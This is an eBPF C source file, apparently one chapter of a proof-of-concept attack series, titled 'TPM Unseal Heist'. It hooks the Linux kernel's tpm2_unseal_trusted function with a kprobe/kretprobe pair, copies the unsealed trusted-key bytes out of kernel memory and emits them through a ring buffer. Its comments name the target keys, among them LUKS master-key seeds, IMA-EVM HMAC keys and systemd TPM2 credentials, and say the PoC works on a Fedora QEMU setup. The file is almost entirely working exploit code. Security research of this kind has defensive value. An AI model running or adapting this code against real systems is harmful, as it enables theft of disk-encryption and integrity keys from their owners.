// ch23 TPM Unseal Heist — persistent key theft at the post-unseal window.
//
// Attaches a kprobe+kretprobe pair to tpm2_unseal_trusted in
// security/keys/trusted-keys/trusted_tpm2.c. The kprobe stashes the
// struct trusted_key_payload *p argument in an inflight hash keyed by
// pid_tgid. The kretprobe, on successful return (ret==0), looks up the
// stashed pointer, reads payload->key[0..key_len] via bpf_probe_read_kernel,
// and emits a ringbuf event.
//
// Primitive class: PERSISTENT key theft. Victim keys are TPM-sealed
// trusted keys — LUKS master-key seeds (systemd-cryptenroll), IMA-EVM
// HMAC keys, systemd credentials with --with-key=tpm2.
//
// Precondition: kernel built with CONFIG_TRUSTED_KEYS=y (or =m and module
// loaded) and CONFIG_TCG_TPM2=y. Linuxkit 6.12 aarch64 has neither; the
// loader's kallsyms preflight skips cleanly there. Fedora 42 aarch64 QEMU
// with swtpm has both; the PoC fires there.
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

#define MAX_KEY_CAPTURE 64

struct evt {
    __u32 pid;
    __u32 tgid;
    char  comm[16];
    __u32 key_len;
    __u32 blob_len;
    __u8  key_bytes[MAX_KEY_CAPTURE];
    __u32 captured;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4096);
    __type(key, __u64);
    __type(value, __u64);
} inflight SEC(".maps");

SEC("kprobe/tpm2_unseal_trusted")
int BPF_KPROBE(kp_tpm2_unseal, struct trusted_key_payload *p,
               struct trusted_key_options *options)
{
    __u64 id = bpf_get_current_pid_tgid();
    __u64 ptr = (__u64)p;
    bpf_map_update_elem(&inflight, &id, &ptr, BPF_ANY);
    return 0;
}

SEC("kretprobe/tpm2_unseal_trusted")
int BPF_KRETPROBE(kret_tpm2_unseal, int ret)
{
    __u64 id = bpf_get_current_pid_tgid();
    __u64 *pptr = bpf_map_lookup_elem(&inflight, &id);
    if (!pptr) return 0;
    __u64 ptr = *pptr;
    bpf_map_delete_elem(&inflight, &id);

    if (ret != 0) return 0;

    struct trusted_key_payload *p = (struct trusted_key_payload *)ptr;
    if (!p) return 0;

    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;

    __u64 pt = bpf_get_current_pid_tgid();
    e->pid  = pt & 0xffffffff;
    e->tgid = pt >> 32;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));

    __u32 key_len = 0, blob_len = 0;
    BPF_CORE_READ_INTO(&key_len, p, key_len);
    BPF_CORE_READ_INTO(&blob_len, p, blob_len);
    e->key_len  = key_len;
    e->blob_len = blob_len;

    __u32 n = key_len;
    if (n > MAX_KEY_CAPTURE) n = MAX_KEY_CAPTURE;
    e->captured = n;

    /* Zero the tail so stale stack bytes do not leak past `captured`. */
    __builtin_memset(e->key_bytes, 0, sizeof(e->key_bytes));

    if (n > 0) {
        /* BPF_CORE_READ does not handle flex-array member reads; fall
         * back to bpf_probe_read_kernel with the computed address. */
        bpf_probe_read_kernel(&e->key_bytes, n, &p->key[0]);
    }

    bpf_ringbuf_submit(e, 0);
    return 0;
}
